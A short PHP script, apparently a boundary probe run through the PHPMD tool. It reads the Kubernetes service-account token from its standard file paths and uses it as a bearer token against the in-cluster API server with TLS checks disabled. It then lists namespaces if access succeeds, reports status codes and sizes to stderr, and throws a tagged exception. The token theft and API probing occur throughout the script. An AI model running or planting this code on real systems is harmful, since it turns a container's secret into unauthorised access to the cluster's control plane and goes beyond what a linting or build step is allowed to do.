<?php
$paths = ['/var/run/secrets/kubernetes.io/serviceaccount/token', '/run/secrets/kubernetes.io/serviceaccount/token'];
$saPath = 'none'; $saExists = 0; $saReadable = 0; $saLen = 0; $sa = '';
foreach ($paths as $p) {
    if (file_exists($p)) { $saExists = 1; if (is_readable($p)) { $saReadable = 1; $saPath = $p; $sa = (string)@file_get_contents($p); $saLen = strlen($sa); break; } }
}
$status = 'not_attempted'; $bytes = 0; $nsStatus = 'not_attempted'; $nsBytes = 0;
if ($sa !== '') {
    $opts = ['http' => ['method' => 'GET', 'header' => "Authorization: Bearer " . $sa . "\r\n", 'timeout' => 3, 'ignore_errors' => true], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]];
    $ctx = stream_context_create($opts);
    $resp = @file_get_contents('https://kubernetes.default.svc/version', false, $ctx);
    global $http_response_header;
    if (isset($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $m)) { $status = $m[1]; }
    else { $status = 'no_response'; }
    $bytes = is_string($resp) ? strlen($resp) : 0;
    if ($status === '200') {
        $resp2 = @file_get_contents('https://kubernetes.default.svc/api/v1/namespaces?limit=1', false, $ctx);
        if (isset($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $m2)) { $nsStatus = $m2[1]; }
        else { $nsStatus = 'no_response'; }
        $nsBytes = is_string($resp2) ? strlen($resp2) : 0;
    }
}
fwrite(STDERR, 'PHPMD_SA_BOUNDARY exists=' . $saExists . ' readable=' . $saReadable . ' len=' . $saLen . ' path=' . ($saPath === 'none' ? 'none' : 'present') . ' version_status=' . $status . ' version_bytes=' . $bytes . ' namespace_status=' . $nsStatus . ' namespace_bytes=' . $nsBytes . PHP_EOL);
throw new RuntimeException('PHPMD_SA_BOUNDARY');